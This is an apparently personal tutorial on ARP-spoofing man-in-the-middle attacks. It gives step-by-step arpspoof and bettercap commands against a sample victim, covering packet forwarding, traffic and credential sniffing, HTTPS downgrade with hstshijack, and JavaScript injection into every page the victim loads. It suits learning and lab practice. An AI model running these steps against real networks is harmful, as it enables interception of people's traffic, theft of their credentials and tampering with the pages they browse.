# MITM attacks (Man In The Midle) - ARP spoofing

### What ARP is?

ARP (Address Resolution Protocol) is a protocol used to map an IP address to a MAC address. It is used to find the hardware address of a host from a known IP address.

### What is ARP spoofing?

ARP spoofing is a type of attack in which a malicious actor sends falsified ARP (Address Resolution Protocol) messages to the target machine and to the default gateway. By doing so, the gateway (router) thinks that the attacker's MAC address is the address of the target machine and the target machine thinks that the attacker's MAC address is the address of the gateway. This way, the attacker can intercept the traffic between the target and the gateway.

## ARP spoofing using arpspoof

### Usage:
```
arpspoof -i <interface> -t <target-ip> <gateway-ip>
arpspoof -i <interface> -t <gateway-ip> <target-ip>
```

> **_NOTE:_**<br>
> By default, the linux kernel does not forward packets between interfaces. <br>
> We want our machine to act as a router, so we need to enable packet forwarding by running the following command:
> ```
> echo 1 > /proc/sys/net/ipv4/ip_forward
> ```

### Attack example:
- victim ip address (the target): 192.168.1.10
- gateway ip address (the router): 192.168.1.1
- interface: eth0

1. Enable IP forwarding
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

2. Launch an ARP spoofing attack to the victim:
```
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
# this command changes the arp table of the target (victim)
```

3. Launch an ARP spoofing attack to the gateway:
```
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10 
# this command changes the arp table of the gateway (router)
```

## ARP spoofing using bettercap

### What is bettercap?

Bettercap is a powerful framework for network attacks and monitoring. It offers more features than arpspoof like:
- ARP spoofing
- Sniff data (url, username, password, ...)
- Bypass HTTPS
- Redirect domain requests (DNS spoofing)
- Inject code in loaded pages
- And more...

It is organized in modules, each module has its own commands and options.

### Install bettercap if not installed
```
apt get install bettercap
```

### Usage:
To launch bettercap run: 
```
bettercap -iface <interface>
```

> **_NOTE:_**<br>
> To get help about bettercap usage type `help` in the bettercap console.<br>
> To get help about a specific module type `help <module-name>`.

### Attack example:

- interface: eth0
- target's ip: 192.168.1.10

1. Enable packet forwarding
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

> **_TO INVESTIGATE:_**<br>
> Last time I run this attack on a wireless I had to run the following commands:
> ```
> iptables -A FORWARD -i wlan0 -j ACCEPT
> iptables -A FORWARD -o wlan0 -j ACCEPT
>```
> - Is this need it if the attacker and/or the victim is using wifi?
> - Is this needed when using wired?

2. Launch bettercap
```
bettercap -iface eth0
```

3. Turn on the probe module<br>
The probe module keeps probing for new hosts on the network by sending dummy UDP packets to every possible IP on the subnet.
```
net.probe on
```
> **_NOTE:_**<br>
> The probe module automatically turns the net.recon module on.<br>
> The net.recon module periodically reads the ARP cache in order to monitor for new hosts on the network.

> **_NOTE:_**<br>
> To show a list of all connected clients on the network type:<br>
> ```
> net.show
> ```
>

4. Set arp spoofing parameters
```
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.10
```
> **_NOTE:_**<br>
> ```set arp.spoof.fullduplex true``` tells bettercap to spoof both target and gateway.
> If you want to spoof multiple targets just enter a list of targets ip separetad by comma.

5. Turn on arp spoof module
```
arp.spoof on
```

6. Capture requests<br>
To see all requests and responses the targets are making and receiving activate the net.sniff module:  
```
net.sniff on
```

> **_NOTE:_**
> You can run bettercap with a list of commands stored in a file like:<br>
> ```
> bettercap -iface <interface> -caplet spoof.cap
> ```

## Downgrade https to http
```
hstshijack/hstshijack
```

## JS injection

- To inject js add the js file to the payload in the 'set hstshijack.payloads' in the file /usr/share/bettercap/caplets/hstshijack/hstshijack.cap

```
*:<path_to_js_file>
```
the star means that the file is injected in every website; to inject only in a specific website do this:
```
<website>:<path_to_js_file>
```
